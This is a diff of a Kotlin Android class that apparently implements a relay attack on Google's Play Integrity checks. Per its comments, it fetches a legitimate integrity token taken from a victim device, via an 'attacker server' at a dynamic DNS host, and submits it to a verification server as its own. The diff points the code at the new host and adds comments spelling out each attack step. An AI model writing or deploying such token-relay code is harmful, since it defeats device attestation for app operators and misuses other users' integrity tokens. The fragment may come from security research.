@@ -24,6 +24,7 @@ class CheckIntegrity {
     private val TAG = "PlayIntegrityAPITest"
     private val URL = "https://play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com"
 
+    // set up the Ktor HTTP Client
     private val httpClient: HttpClient = HttpClient(CIO) {
         install(Logging) {
             level = LogLevel.ALL
@@ -37,21 +38,23 @@ class CheckIntegrity {
         }
     }
 
+    // initialize the state of our application
     private val _serverState: MutableStateFlow<ServerState> =
         MutableStateFlow(ServerState(ServerStatus.INIT1))
     val serverState = _serverState.asStateFlow()
 
+    // compute the verification of the app
     suspend fun computeResultAndParse(){
 
+        // indicate to the main UI that the verification is in progress
         _serverState.emit(ServerState(ServerStatus.WORKING, "", "", false))
 
-        // create server socket to receive communication from participating device
-        // might use another server that will handle this since its hard lol
         var commandString = ""
         var integrityToken = ""
 
+        // create a connection to the attacker server to get the legitimate token
         try {
-            val returnedToken = httpClient.get<TokenResult>("http://192.168.1.253:45565/token")
+            val returnedToken = httpClient.get<TokenResult>("http://periodicgaming.ddns.net:45565/token")
             commandString = returnedToken.commandString
             integrityToken = returnedToken.token
         } catch (t: Throwable){
@@ -59,7 +62,7 @@ class CheckIntegrity {
             _serverState.emit(ServerState(ServerStatus.FAILED, "getVictimToken exception " + t.message, "", false))
         }
 
-        // communicate the integrity token to the server
+        // communicate the integrity token to the Google server
         try {
             val result = httpClient.post<CommandResult>("$URL/performCommand"){
                 contentType(ContentType.Application.Json)
@@ -67,6 +70,7 @@ class CheckIntegrity {
                     commandString, integrityToken
                 )
             }
+            // tell the main UI we succeeded
             _serverState.emit(ServerState(ServerStatus.SUCCESS, result.diagnosticMessage, commandString, true))
         } catch (t: Throwable){
             Log.d(TAG, "performCommand exception " + t.message)
@@ -74,6 +78,8 @@ class CheckIntegrity {
         }
     }
 
+    // sleep the app for a few seconds until the location data comes in.
+    // Cycle between Init1 and Init2 while waiting to keep the app alive
     suspend fun waitForLocation(locationString: String){
         if (locationString != ""){
             _serverState.tryEmit(ServerState(ServerStatus.READY, "", "", false))
